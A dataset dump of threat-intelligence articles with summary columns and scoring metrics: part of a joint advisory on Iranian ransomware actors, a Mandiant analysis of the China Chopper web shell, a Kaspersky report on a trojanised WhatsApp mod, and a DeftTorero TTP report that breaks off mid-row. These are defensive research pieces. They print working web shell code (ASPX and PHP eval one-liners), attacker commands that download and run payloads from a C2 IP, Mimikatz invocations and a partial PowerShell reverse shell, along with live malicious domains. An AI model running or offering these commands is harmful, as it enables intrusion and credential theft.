cyber incident response plan that includes response procedures for a ransom incident.Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, secure location (e.g., hard drive, storage device, the cloud).Patch and Update SystemsU.S. federal, state, local, tribal, and territorial (SLTT) government and critical infrastructure organizations: Implement free CISA Cyber Hygiene Services Vulnerability Scanning to enable continuous scans of public, static IPs for accessible services and vulnerabilities.Install updates/patch operating systems, software, and firmware as soon as updates/patches are released. Regularly check software updates and end-of-life notifications. Consider leveraging a centralized patch management system to automate and expedite the process.Immediately patch software affected by vulnerabilities identified in this advisory: CVE-2021- 34473, CVE-2018-13379, CVE-2020-12812, CVE-2019-5591, CVE-2021-34523, CVE-2021- 31207, CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-31196, CVE-2021- 31206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470.Evaluate and Update Blocklists and AllowlistsRegularly evaluate and update blocklists and allowlists.If FortiOS is not used by your organization, add the key artifact files used by FortiOS to your organization's execution blocklist. Prevent any attempts to install or run this program and its associated files.Implement Network SegmentationImplement network segmentation to restrict a malicious threat actor's lateral movement.Secure User AccountsAudit user accounts with administrative privileges and configure access controls under the principles of least privilege and separation of duties.Require administrator credentials to install software.Implement Multifactor AuthenticationUse multifactor authentication where possible, particularly for webmail, virtual private networks (VPNs), accounts that access critical systems, and privileged accounts that manage backups.Use Strong PasswordsRequire all accounts with password logins to have strong, unique passwords. See CISA Tip Choosing and Protecting Passwords and National Institute of Standards and Technology (NIST) Special Publication 800-63B: Digital Identity Guidelines for more information.Secure and Monitor RDP and other Potentially Risky ServicesIf you use RDP, restrict it to limit access to resources over internal networks. After assessing risks, if your organization deems RDP operationally necessary, restrict the originating sources, and require MFA to mitigate credential theft and reuse. If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices.Disable unused remote access/RDP ports.Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts (to block brute force campaigns), and log RDP login attempts.Use Antivirus ProgramsInstall and regularly update antivirus and anti-malware software on all hosts.Secure Remote AccessOnly use secure networks.Consider installing and using a VPN for remote access.VALIDATE SECURITY CONTROLSIn addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.To get started:Select an ATT&CK technique described in this advisory (see Appendix B). Align your security technologies against the technique. Test your technologies against the technique. Analyze your detection and prevention technologies performance. Repeat the process for all security technologies to obtain a set of comprehensive performance data. Tune your security program, including people, processes, and technologies, based on the data generated by this process.The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.RESPONDING TO RANSOMWARE OR EXTORTION INCIDENTSIf a ransomware or extortion incident occurs at your organization:Note: The authoring agencies strongly discourage paying ransoms as doing so does not guarantee files and records will be recovered and may pose sanctions risks.RESOURCESThe U.S. Department of State's Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.For more information on malicious cyber activity affiliated with the Iranian government- sponsored malicious cyber activity, see us-cert.cisa.gov/Iran and FBI's Iran Threat page.For information and resources on protecting against and responding to ransomware or extortion activity, refer to StopRansomware.gov, the U.S. centralized, whole-of-government webpage providing ransomware resources and alerts.The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States: Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate malicious activity.ACSC can provide tailored cyber security advice and assistance, reporting, and incident response support at cyber.gov.au and via 1300 292 371 (1300 CYBER1).PURPOSEThis advisory was developed by U.S., Australian, Canadian, and UK cybersecurity authorities in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations.DISCLAIMERThe information in this report is being provided ""as is"" for informational purposes only. FBI, CISA, NSA, USCC-CNMF, DoT, ACSC, CCCS, and NCSC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring.APPENDIX A: INDICATORS OF COMPROMISEIP addresses and executables files are listed below. For a downloadable copy of IOCs, see AA22- 257A.stix.IP Addresses54.39.78[.]14895.217.193[.]86104.168.117[.]149107.173.231[.]114144.76.186[.]88148.251.71[.]182172.245.26[.]118185.141.212[.]131198.12.65[.]175198.144.189[.]74Note: Some of these observed IP addresses may be outdated. The authoring agencies recommend organizations investigate or vet these IP addresses prior to taking action, such as blocking.Malicious Domainsnewdesk[.]topsymantecserver[.]comsupdate[.]usmsupdate[.]topgupdate[.]usaptmirror[.]eubuylap[.]topwinstore[.]ustcp443[.]orgmssync[.]oneupmirror[.]toptcp443 (subdomain)kcp53 (subdomain)FilesMalicious files observed in this activity are identified in Table 1. Many of the below malicious files are masquerading as legitimate Windows files, therefore, file names alone should not be treated as an indicator of compromise. Note: For additional malicious files observed, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.Filename: Wininet[.]xml Path: C:\Windows\Temp\wininet[.]xml MD5: d2f4647a3749d30a35d5a8faff41765e SHA-1: 0f676bc786db3c44cac4d2d22070fb514b4cb64c SHA-256: 559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e Filename: Wininet'[.]xml MD5: 2e1e17a443dc713f13f45a9646fc2179 SHA-1: e75bfc0dd779d9d8ac02798b090989c2f95850dc Filename: WinLogon[.]xml Path: C:\Windows\Temp\WinLogon[.]xml MD5: 49c71178fa212012d710f11a0e6d1a30 SHA-1: 226f0fbb80f7a061947c982ccf33ad65ac03280f SHA-256: bcc2e4d96e7418a85509382df6609ec9a53b3805effb7ddaed093bdaf949b6ea Filename: Wininet[.]bat Path: C:\Windows\wininet[.]bat MD5: 5f098b55f94f5a448ca28904a57c0e58 SHA-1: 27102b416ef5df186bd8b35190c2a4cc4e2fbf37 SHA-256: 668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0 Filename: Winlogon[.]bat Path: C:\Windows\winlogon[.]bat MD5: 7ac4633bf064ebba9666581b776c548f SHA-1: 524443dd226173d8ba458133b0a4084a172393ef SHA-256: d14d546070afda086a1c7166eaafd9347a15a32e6be6d5d029064bfa9ecdede7 Filename: CacheTask[.]bat Path: C:\\ProgramData\Microsoft\CacheTask[.]bat MD5: ee8fd6c565254fe55a104e67cf33eaea SHA-1: 24ed561a1ddbecd170acf1797723e5d3c51c2f5d SHA-256: c1723fcad56a7f18562d14ff7a1f030191ad61cd4c44ea2b04ad57a7eb5e2837Filename: Task_update[.]exe Path: C:\Windows\Temp\task_update[.]exe MD5: cacb64bdf648444e66c82f5ce61caf4b SHA-1: 3a6431169073d61748829c31a9da29123dd61da8 SHA-256: 12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a Filename: Task[.]exe MD5: 5b646edb1deb6396082b214a1d93691b SHA-1: 763ca462b2e9821697e63aa48a1734b10d3765ee SHA-256: 17e95ecc7fedcf03c4a5e97317cfac166b337288562db0095ccd24243a93592f Filename: dllhost[.]exe Path: C:\Windows\dllhost[.]exe MD5: 0f8b592126cc2be0e9967d21c40806bc 9a3703f9c532ae2ec3025840fa449d4e SHA-1: 3da45558d8098eb41ed7db5115af5a2c6 1c543af 8ece87086e8b5aba0d1cc4ec3804bf74e 0b45bee SHA-256: 724d54971c0bba8ff32aeb6044d3b3fd57 1b13a4c19cada015ea4bcab30cae26 1604e69d17c0f26182a3e3ff65694a4945 0aafd56a7e8b21697a932409dfd81e Filename: svchost[.]exe Path: C:\Windows\svchost[.]exe MD5: 68f58e442fba50b02130eedfc5fe4e5b 298d41f01009c6d6240bc2dc7b769205 SHA-1: 76dd6560782b13af3f44286483e157848 efc0a4e 6ca62f4244994b5fbb8a46bdfe62aa1c95 8cebbd SHA-256: b04b97e7431925097b3ca4841b894139 7b0b88796da512986327ff66426544ca 8aa3530540ba023fb29550643beb00c9c 29f81780056e02c5a0d02a1797b9cd9 Filename: User[.]exe Path: C:\Windows\Temp\user[.]exe MD5: bd131ebfc44025a708575587afeebbf3 f0be699c8aafc41b25a8fc0974cc4582 SHA-1: 8b23b14d8ec4712734a5f6261aed40942 c9e0f68 6bae2d45bbd8c4b0a59ba08892692fe86 e596154 SHA-256: b8a472f219658a28556bab4d6d109fdf3 433b5233a765084c70214c973becbbd 7b5fbbd90eab5bee6f3c25aa3c2762104 e219f96501ad6a4463e25e6001eb00bFilename: Setup[.]bat Path: C:\Users\DefaultAccount\Desktop\New folder\setup[.]bat MD5: 7fdc2d007ef0c1946f1f637b87f81590 Filename: Ssasl[.]pmd Path: C:\Windows\Temp\ssasl[.]pmd Filename: Ssasl[.]zip Path: C:\Windows\Temp\ssasl[.]zip Filename: netscanold[.]exe Path: C:\Users\DefaultAccount\Desktopetscanoldetscanold[.]exe Filename: scan[.]csv Path: C:\Users\DefaultAccount\Desktop\scan[.]csv Filename: lsass[.]dmp Path: C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]dmp Filename: lsass[.]zip Path: C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]zipAPPENDIX B: MITRE ATT&CK TACTICS AND TECHNIQUESTable 2 identifies MITRE ATT&CK Tactics and techniques observed in this activity.Table 2: Observed Tactics and Techniques Tactic Technique Resource Development ]TA0042] Obtain Capabilities: Malware [T1588.001] Obtain Capabilities: Tool [T1588.002] Initial Access [TA0001] Exploit Public-Facing Application [T1190] Execution [TA0002] Scheduled Task/Job: Scheduled Task [T1053.005] Persistence [TA0003] Create Account: Local Account [T1136.001] Create Account: Domain Account [T1136.002] Privilege Escalation [TA0004] Credential Access [TA0006] Collection [TA0009] Archive Collected Data: Archive via Utility [T1560.001] Exfiltration [TA0010] Impact [TA0040] Data Encrypted for Impact [T1486]RevisionsSeptember 14, 2022: Initial Version";This advisory was developed by U.S., Australian, Canadian, and UK cybersecurity authorities in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations. IOCs observed in this activity are identified in Table 1. The ITSecurity report has been successfully summarized. Table 2: Observed Tactics and Techniques Tactic Technique Resource Development ]TA0042] Obtain Capabilities: Malware [T1588.001] Obtain Capabilities: Tool [T1588.002] Initial Access [TA0001] Exploit PublicFacing Application [T1190] Execution [TA0002] Scheduled Task/Job: Scheduled Task [T1053.005] Persistence [TA0003] Create Account: Local Account [T1136.001] Create Account: Domain Account [T1136.002] Privilege Escalation [TA0004] Credential Access [TA0006] Collection [TA0009] Archive Collected Data: Archive via Utility [T1560.001] Exfiltration [TA0010] Impact [TA0040] Data Encrypted for Impact [T1486];en;{'r': 0.07345065034429993, 'p': 0.9504950495049505, 'f': 0.13636363503188964};{'r': 0.04204322200392927, 'p': 0.8916666666666667, 'f': 0.0803001867572486};{'r': 0.07268553940321347, 'p': 0.9405940594059405, 'f': 0.13494318048643508}
https://www.mandiant.com/resources/blog/breaking-down-china-chopper-web-shell-part-i;Breaking Down the China Chopper Web Shell - Part I;"Part I in a two-part series.China Chopper: The Little Malware That CouldChina Chopper is a slick little web shell that does not get enough exposure and credit for its stealth. Other than a good blog post from security researcher Keith Tyler, we could find little useful information on China Chopper when we ran across it during an incident response engagement. So to contribute something new to the public knowledge base -- especially for those who happen to find the China Chopper server-side payload on one of their Web servers -- we studied the components, capabilities, payload attributes, and the detection rate of this 4 kilobyte menace.ComponentsChina Chopper is a fairly simple backdoor in terms of components. It has two key components:the Web shell command-and-control (CnC) client binary and a text-based Web shell payload (server component). The text-based payload is so simple and short that an attacker could type it by hand right on the target server -- no file transfer needed.Web Shell ClientThe Web shell client used to be available on www.maicaidao.com, but we would advise against visiting that site now.Web shell (CnC) Client MD5 Hash caidao.exe caidao.exe 5001ef50c7e869253a7c152a638eab8a 5001ef50c7e869253a7c152a638eab8aThe client binary is packed with UPX and is 220,672 bytes in size, as shown in Figure 1.Figure 1: Client binary viewed in WinHexUsing the executable file compressor UPX to unpack the binary allows us to see some of the details that were hidden by the packer.C:\Documents and Settings\Administrator\Desktop>upx -d 5001ef50c7e869253a7c152a638eab8a.exe -o decomp.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2011 UPX 3.08w Markus Oberhumer, Laszlo Molnar & John Reiser Dec 12th 2011 File size Ratio Format Name -------------------- ------ ----------- ----------- 700416 <- 220672 31.51% win32/pe decomp.exe Unpacked 1 file.Using PEiD (a free tool for detecting packers, cryptors and compilers found in PE executable files), we see that the unpacked client binary was written in Microsoft Visual C++ 6.0, as shown in Figure 2.Figure 2: PEiD reveals that the binary was written using Visual C++ 6.0Because the strings are not encoded, examining the printable strings in the unpacked binary provides insight into how the backdoor communicates. We were intrigued to see a reference to google.com.hk using the Chinese (simplified) language parameter (Figure 3) as well as references to the text ""Chopper"" (Figure 4).Figure 3: Printable strings refer to www.google.com.hkFigure 4: References to Chopper in the client binarySo we have highlighted some attributes of the client binary. But what does it look like in use? China Chopper is a menu-driven GUI full of convenient attack and victim-management features. Upon opening the client, you see example shell entries that point to www.maicaidao.com, which originally hosted components of the Web shell.To add your own target, right click within the client, select ""Add"" and enter the target IP address, password, and encoding as shown in Figure 5.Figure 5: Picture of the China Chopper Web shell client binaryServer-side Payload ComponentBut the client is only half of the remote access tool -- and not likely the part you would find on your network. Its communication relies on a payload in the form of a small Web application. This payload is available in a variety of languages such as ASP, ASPX, PHP, JSP, and CFM. Some of the original files that were available for download are shown with their MD5 hashes:Web shell Payload MD5 Hash Customize.aspx Customize.aspx 8aa603ee2454da64f4c70f24cc0b5e08 8aa603ee2454da64f4c70f24cc0b5e08 Customize.cfm Customize.cfm ad8288227240477a95fb023551773c84 ad8288227240477a95fb023551773c84 Customize.jsp Customize.jsp acba8115d027529763ea5c7ed6621499 acba8115d027529763ea5c7ed6621499Source: http://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.htmlEven though the MD5s are useful, keep in mind that this is a text-based payload that can be easily changed, resulting in a new MD5 hash. We will discuss the payload attributes later, but here is an example of just one of the text-based payloads:ASPX:<%@ Page Language=""Jscript""%><%eval(Request.Item[""password""],""unsafe""),%>Note that ""password"" would be replaced with the actual password to be used in the client component when connecting to the Web shell.In the next post, we provide regular expressions that can be used to find instances of this Web shell.CapabilitiesThe capabilities of both the payload and the client are impressive considering their size. The Web shell client contains a ""Security Scan"" feature, independent of the payload, which gives the attacker the ability to spider and use brute force password guessing against authentication portals.Figure 6: China Chopper provides a ""Security Scan"" featureIn addition to vulnerability hunting, this Web shell has excellent CnC features when combining the client and payload, include the following:File Management (File explorer)Database Management (DB client)Virtual Terminal (Command shell)In China Chopper's main window, right-clicking one of the target URLs brings up a list of possible actions (see Figure 7).Figure 7: Screenshot of the CnC client showing capabilities of the Web shellFile ManagementUsed as a remote access tool (RAT), China Chopper makes file management simple. Abilities include uploading and downloading files to and from the victim, using the file-retrieval tool wget to download files from the Web to the target, editing, deleting, copying, renaming, and even changing the timestamp of the files.Figure 8: File Management provides an easy to use menu that is activated by right-clicking on a file nameSo just how stealthy is the ""Modify the file time"" option? Figure 9 shows the timestamps of the three files in the test directory before the Web shell modifies the timestamps. By default, Windows Explorer shows only the ""Date Modified"" field. So normally, our Web shell easily stands out because it is newer than the other two files.Figure 9: IIS directory showing time stamps prior to the time modificationFigure 10 shows the date of the file after the Web shell modifies the timestamp. The modified time on our Web shell shows up as the same as the other two files. Because this is the default field displayed to users, it easily blends in to the untrained eye -- especially with many files in the directory.Figure 10: IIS directory showing time stamps after the time modificationClever investigators may think that they can spot the suspicious file due to the creation date being changed to the same date as the modified date. But this is not necessarily anomalous. Additionally, even if the file is detected, the forensic timeline would be skewed because the date that the attacker planted the file is no longer present. To find the real date the file was planted, you need to go to the Master File Table (MFT). After acquiring the MFT using FTK, EnCase, or other means, we recommend using mftdump (available from http://malware-hunters.net/all-downloads/). Written by FireEye researcher Mike Spohn, mftdump is a great tool for extracting and analyzing file metadata.The following table shows the timestamps pulled from the MFT for our Web shell file. We pulled the timestamps before and after the timestamps were modified. Notice that the ""fn*"" fields retain their original times, thus all is not lost for the investigator!Category Pre-touch match Post-touch match siCreateTime (UTC) siCreateTime (UTC) 6/6/2013 16:01 6/6/2013 16:01 2/21/2003 22:48 2/21/2003 22:48 siAccessTime (UTC) siAccessTime (UTC) 6/20/2013 1:41 6/20/2013 1:41 6/25/2013 18:56 6/25/2013 18:56 siModTime (UTC) siModTime (UTC) 6/7/2013 0:33 6/7/2013 0:33 2/21/2003 22:48 2/21/2003 22:48 siMFTModTime (UTC) siMFTModTime (UTC) 6/20/2013 1:54 6/20/2013 1:54 6/25/2013 18:56 6/25/2013 18:56 fnCreateTime (UTC) fnCreateTime (UTC) 6/6/2013 16:01 6/6/2013 16:01 6/6/2013 16:01 6/6/2013 16:01 fnAccessTime (UTC) fnAccessTime (UTC) 6/6/2013 16:03 6/6/2013 16:03 6/6/2013 16:03 6/6/2013 16:03 fnModTime (UTC) fnModTime (UTC) 6/4/2013 15:42 6/4/2013 15:42 6/4/2013 15:42 6/4/2013 15:42 fnMFTModTime (UTC) fnMFTModTime (UTC) 6/6/2013 16:04 6/6/2013 16:04 6/6/2013 16:04 6/6/2013 16:04Database ManagementThe Database Management functionality is impressive and helpful to the first-time user. Upon configuring the client, China Chopper provides example connection syntax.Figure 11: Database Management requires simple configuration parameters to connectAfter connecting, China Chopper also provides helpful SQL commands that you may want to run.Figure 12: Database Management provides the ability to interact with a database and even provides helpful prepopulated commandsCommand Shell AccessFinally, command shell access is provided for that OS level interaction you crave. What a versatile little Web shell!Figure 13: Virtual Terminal provides a command shell for OS interactionPayload AttributesWe stated above that this backdoor is stealthy due to a number of factors including the following:SizeServer-side contentClient-side contentAV detection rateSizeLegitimate and illegitimate software usually suffer from the same principle: more features equals more code, which equals larger size. Considering how many features this Web shell contains, it is incredibly small -- just 73 bytes for the aspx version, or 4 kilobytes on disk (see Figure 14). Compare that to other Web shells such as Laudanum (619 bytes) or RedTeam Pentesting (8,527 bytes). China Chopper is so small and simple that you could conceivably type the contents of the shell by hand.Figure 14: China Chopper file propertiesServer-Side ContentThe server side content could easily be overlooked among the other files associated with a vanilla install of a complex application. The code does not look too evil in nature, but is curious.Figure 15: The content of the file seems relatively benign, especially if you add a warm and fuzzy word like Security as the shell passwordBelow are the contents of the Web shell for two of its varieties.ASPX:<%@ Page Language=""Jscript""%><%eval(Request.Item[""password""],""unsafe""),%>PHP:<?php @eval($_POST['password']),?>Client-Side ContentBecause all of the code is server-side language that does not generate any client-side code, browsing to the Web shell and viewing the source as a client reveals nothing.Figure 16: Viewing the source of the web shell reveals nothing to the clientAnti-virus Detection RateRunning the Web shell through the virus-scanning website No Virus Thanks shows a detection rate of 0 out of 14, indicating that most, if not all, anti-virus tools would miss the Web shell on an infected system.Figure 17: Results of multiple anti-virus engine inspections showing China Chopper coming up cleanThe same holds true for VirusTotal. None of its 47 anti-virus engines flags China Chopper as malicious.Figure 18: Results of multiple AV engine inspections showing the Web shell comes up cleanConclusionWe hope that this post has advanced the understanding of this compact, flexible, and stealthy Web shell. If you are reading this, you may be facing China Chopper right now -- if so, we wish you success in eradicating this pest. In Part II, we examine the platform China Chopper runs on and describe its delivery mechanisms, traffic analysis and detection.";"The following table shows the timestamps pulled from the MFT for our Web shell file. We pulled the timestamps before and after the timestamps were modified. Notice that the ""fn*"" fields retain their original times, thus all is not lost for the investigator! <table> <tr> <th>Category</th> <th>Pretouch match</th> <th>Posttouch match</th> <th>siCreateTime (UTC)</th> <th>siAccessTime (UTC)</th> <th>siModTime (UTC)</th> <th>siMFTModTime (UTC)</th> <th>fnCreateTime (UTC)</th> <th>fnAccessTime (UTC)</th> <th>fnModTime (UTC)</th> <th>Database Management</th> <th>Command Shell Access</th> <th>Payload Attributes</th> </tr> <tr> <td>Category</td> <td>Pretouch match</td> <td>Posttouch match</td> <td>siCreateTime (UTC)</td> <td>siAccessTime (UTC)</td> <td>siModTime (UTC)</td> <td>siMFTModTime (UTC)</td> <td>fnCreateTime (UTC)</td> <td>fnAccessTime (UTC)</td> <td>fnModTime (UTC)</td> <td>Database Management</td> <td>Command Shell Access</td> <td>Payload Attributes</td> </tr> <tr> <td>Category</td> <";en;{'r': 0.04456094364351245, 'p': 0.4533333333333333, 'f': 0.08114558309576163};{'r': 0.027177700348432057, 'p': 0.3979591836734694, 'f': 0.05088062502628627};{'r': 0.04456094364351245, 'p': 0.4533333333333333, 'f': 0.08114558309576163}
https://securelist.com/malicious-whatsapp-mod-distributed-through-legitimate-apps/107690/;Malicious WhatsApp mod distributed through legitimate apps;Last year, we wrote about the Triada Trojan inside FMWhatsApp, a modified WhatsApp build. At that time, we discovered that a dropper was found inside the distribution, along with an advertising SDK. This year, the situation has repeated, but with a different modified build, YoWhatsApp version 2.22.11.75. Inside it, we found a malicious module that we detect as Trojan.AndroidOS.Triada.eq.Launching a malware module built into the modificationThe module decrypted and launched the Trojan.AndroidOS.Triada.ef main payload.Payload decoding and launchIn addition, the malicious module stole various keys required for legitimate WhatsApp to work. We assume that to resolve this problem, the cybercriminals had to figure out all the intricacies of the messenger before writing the new version.The Trojan reads WhatsApp keys...... and sends collected data to the control serverThe keys of interest to the cybercriminals are typically used in open-source utilities that allow the use of a WhatsApp account without the app. If the keys are stolen, a user of a malicious WhatsApp mod can lose control over their account.Registering with yowsup requires the collected WhatsApp keysWe note that in other respects, the infected build of YoWhatsApp is a fully working messenger with some additional features, such as customizing interface or blocking access to individual chats. When installed, it asks for the same permissions as the original WhatsApp messenger, such as access to SMS. The same permissions are granted to the Triada Trojan. It, and similar malware, can use them to add paid subscriptions without the user's knowledge, for example.How the malicious YoWhatsApp messenger is spreadAfter discovering a new malicious WhatsApp mod, we decided to find out where it was coming from. According to statistics, the source was ads in the popular Snaptube app. After a brief check, we confirmed that you can find YoWhatsApp ads in the official Snaptube app (MD5: C3B2982854814E537CD25D27E295CEFE), and when clicking on one, the user will be prompted to install the malicious build.This is not the first time we've encountered this kind of distribution method. Previously, for example, a similar situation occurred with the CamScanner app, a version of which, posted on Google Play Market, contained an ad library with a malicious component. We warned the developers of Snaptube that the ads in their app were being used by cybercriminals.Our investigation did not end there. We later found a malicious version of the YoWhatsApp build in the popular Vidmate mobile app (MD5 CBA56F43C1EF32C43F7FC5E2AC368CDC) designed to save and watch videos from YouTube. Unlike Snaptube, the malicious build was uploaded in the internal store, which is part of Vidmate. The modification's name is WhatsApp Plus, but its features, legitimate and malicious, are similar to those found on Snaptube. The YoWhatsApp build version is also the same.The YoWhatsApp mod with a malicious module found in Vidmate is called WhatsApp PlusConclusionCybercriminals are increasingly using the power of legitimate software to distribute malicious apps. This means that users who choose popular apps and official installation sources, may still fall victim to them. In particular, malware like Triada can steal an IM account, and for example, use it to send unsolicited messages, including malicious spam. The user's money is also at risk, as the malware can easily set up paid subscriptions for the victim.Update November 10, 2022:We have been in touch with the YoWhatsapp developer and the malicious module has been removed from the modification (MD5 of the new file: dcf8a43955b00d037cd6d7a784cbfe0b).IOCsMD5AC6C42D2F312FE8E5FB48FE91C83656BCAA640824B0E216FAB86402B1444795372645469B04AF2D89BC24ADDA2705B68DEAAFDD4B289443261E18B244EAFB577F67A1866C962F870571587B833ADD47B47674B2ADA8586ACAF34065FF4CF788A8EE2DF87E75CC8AB1B77C54288D7A2D9C&Chxxps://wa.zcnewy[.]comhxxp://av2wg.rt14v[.]com:13002hxxps://g1790.rt14v[.]com:13001;NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://securelist.com/defttorero-tactics-techniques-and-procedures/107610/;DeftTorero TTPs in 2019–2021;"Earlier this year, we started hunting for possible new DeftTorero (aka Lebanese Cedar, Volatile Cedar) artifacts. This threat actor is believed to originate from the Middle East and was publicly disclosed to the cybersecurity community as early as 2015. Notably, no other intelligence was shared until 2021, which led us to speculate on a possible shift by the threat actor to more fileless/LOLBINS techniques, and the use of known/common offensive tools publicly available on the internet that allows them to blend in.The public reports available to date expose and discuss the final payload - Explosive RAT - and the webshells used in the initial foothold such as Caterpillar and ASPXSpy (you can find webshell MD5 hashes in the IoC section), with little on the tactics, techniques and procedures (TTPs), this post focuses primarily on the TTPs used by the threat actor in intrusions between late 2019 and mid-2021 to compromise victims.More information about DeftTorero is available to customers of Kaspersky Intelligence Reporting.Contact us: intelreports@kaspersky.comInitial Access and webshell deploymentDuring our intrusion analysis of DeftTorero's webshells, such as Caterpillar, we noticed traces that infer the threat actor possibly exploited a file upload form and/or a command injection vulnerability in a functional or staging website hosted on the target web server. This assumption is based on the fact that the uploaded webshells always drop in the same web folder, and in some cases get assigned a name containing a GUID followed by the original webshell filename.In other instances, we noticed traces pointing to a possible exploitation of IIS PHP plugins pre-installed by the server admins. And finally, in some other instances, we suspect the operators gained server credentials from other systems in the same organization and logged in using a remote desktop (MSTSC.exe) to deploy the webshell.Once the threat actor succeeds in identifying a method to upload a webshell, they attempt to drop several webshell types and families, most of which are blocked by the AV engine. We suspect that almost all the webshells dropped (including ASPXSpy, devilzshell, etc.) originate from a GitHub account, and are either used as is or are slightly modified.DiscoveryUpon successful installation of the webshell, the operators run multiple commands to gain situational awareness from the exploited system. This includes testing network connectivity by pinging Google.com, listing current folders, identifying the current user privileges, enumerating local system users, and listing websites hosted by the compromised server. The operators also attempt to assess if the web server is joined and/or trusted by any domain. At a later stage, this will prove useful as it will inform them on the next course of actions for dumping local or domain credentials.Command Purpose cmd.ex? /c who?mi Identify user privileges cmd.ex? /c ?ppcmd list site List the hosted websites on the web server cmd.ex? /c nlt?st /domain_trusts List domain controllers and enumerate domain trusts cmd.ex? /? dir List current directories and files cmd.ex? /c n?t view Display a list of domains, computers, or resources that are being shared by the specified computer cmd.ex? /c s?t Display the current environment variable settings cmd.ex? /c syst?minfo Display system profile and installed hotfixes cmd.ex? /c ipconfig -displ?ydns Display DNS resolver cache cmd.ex? /c ipconfig -?ll Display network configuration on all network interfaces cmd.ex? /c n?t user Display local users cmd.ex? /c n?t user /domain Display domain users cmd.ex? /c n?t use Display mapped drives to local system cmd.ex? /c op?nfil?s Display files opened remotelyTable. 1 Operator commands executed through webshellAfter gaining situational awareness, the operators attempt to load/invoke a number of tools to dump local and domain credentials. In some cases, the threat actor attempts to install Nmap and Advanced Port Scanner, possibly to scan internal systems.Dumping credentialsCredential dumping methods differed from one case to another. In some instances, Lazagne.exe was used, in others Mimikatz variants were used either by executing the respective PE binary or by invoking a base64-encoded PowerShell version from a GitHub project. In a smaller number of instances, possibly due to AV detection, the operators dumped the LSASS.exe process to disk, most probably to process it offline for credential dumping.Command Comment IEX (New-ObjectNet.WebClient).Downlo?dString(""htt?s://raw.githubusercont?nt.com/BC-SECURITY/Empire/master/data/module_source/cr?dentials/Invoke-Mimikatz.ps1""), Invoke-Mimik?tz -Commandprivil?ge::d?bug, Invoke-Mimik?tz -DumpCr?ds, Decoded base64 command issued through webshell to invoke Mimikatz to dump passwords IEX (New-ObjectNet.WebClient).Downlo?dString('htt?s://raw.githubusercontent.com/putterp?nda/mimikitt?nz/master/Invoke-mimikitt?nz.ps1'), Invoke-mimikitt?nz Decoded base64 command issued through webshell to invoke Mimikittenz to dump passwordsTable. 2 Operators invoking Mimikatz variantsOnce credentials are obtained, it is believed the operators use Remote Desktop Protocol to pivot into internal systems, or reachable systems that are likely using the stolen credentials (e.g., trusted partners). This is also reinforced by timeline analysis where the threat actor deployed a webshell at another web server in the same network without exploiting a file upload form/vulnerability.The many ways to achieve ExecutionFurther commands were executed to bypass the AV engine and establish a Meterpreter session with the operators' C2 server. After a Meterpreter session is established, the operators attempt to again invoke Mimikatz variants to gain system and/or domain credentials. It's worth mentioning that in older intrusions, the threat actor deployed Explosive RAT instead of using Meterpreter.Command Comment cmd.ex? /c ""regsvr32 /s /n /u /i:htt?://200.159.87[.]196:3306/jsJ13j.sctscrobj.dll 2>&1 Alternative methods to achieve command execution while bypassing security controls using LOLBINs such as REGSVR32 and MSIEXEC cmd.ex? /c ""powershell -command ""regsvr32 /s /n /u/i:htt?://200.159.87[.]196:3306/jsJ13j.sct scrobj.dll"" 2>&1 cmd.ex? /c ""powersh?ll.exe -executionpolicy bypass -w hidden ""iex(New-ObjectSystem.Net.WebClient).DownloadString('htt?://200.159.87[.]196/made.ps1'), made.ps1"" 2>&1 cmd.ex? /c ""powersh?ll.exe -c ""(New-ObjectSystem.NET.W?bClient).DownloadFile('htt?://200.159.87[.]196/av.vbs',\""$env:temp\av.vbs\""),Start-Proc?ss %windir%\system32\cscript.ex?\""$env:temp\av.vbs\"""" 2>&1 cmd.exe /c ""powersh?ll.exe -executionpolicy bypass -w hidden ""iex(New-ObjectSystem.Net.WebClient).DownloadString('htt?://<internal_IP_address>:8000/made.ps1?), made.ps1? 2>&1 cmd.exe /c ""powersh?ll -nop -c ""$client = New-ObjectSystem.Net.Sockets.TCPClient('200.159.87[.]196',3306),$str?am =$client.G?tStream(),[byte[]]$bytes = 0..65535|%{0},while(($i =$stream.R?ad($bytes, 0, $bytes.Length)) -ne 0){,$data = (New-Object -TypeName System.Text.ASCIIEncoding).G?tString($bytes,0, $i),$sendback =(iex $data 2>&1 | Out-String ),$sendback2 = $sendback + 'PS ' +(pwd).Path + '> ',$s?ndbyte 